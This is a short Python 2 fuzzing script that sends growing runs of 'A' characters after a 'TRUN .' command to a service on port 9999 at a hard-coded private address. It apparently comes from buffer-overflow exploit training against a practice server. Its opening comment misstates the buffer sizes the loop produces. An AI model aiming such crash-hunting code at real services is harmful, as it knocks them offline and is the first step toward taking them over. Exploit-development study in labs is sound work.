#!/usr/bin/python
import socket

# Create an array of buffers, from 1 to 5000, with increments of 200.

buffer=["A"]

counter=100

while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing TRUN input with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("10.11.20.27",9999))
	s.recv(1024)
	s.send("TRUN ." + string)
	s.recv(1024)
	s.close()
